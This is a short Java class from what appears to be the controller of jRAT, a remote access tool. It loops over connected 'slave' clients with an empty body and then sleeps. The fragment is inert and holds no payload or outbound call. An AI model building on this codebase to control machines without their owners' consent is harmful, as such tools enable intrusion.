package se.jrat.client.threads;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;

public class RunnableNetworkCounter implements Runnable {
	
	@Override
	public void run() {
		try {
			for (AbstractSlave slave : Main.connections) {
				
			}
			
			Thread.sleep(1000L);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
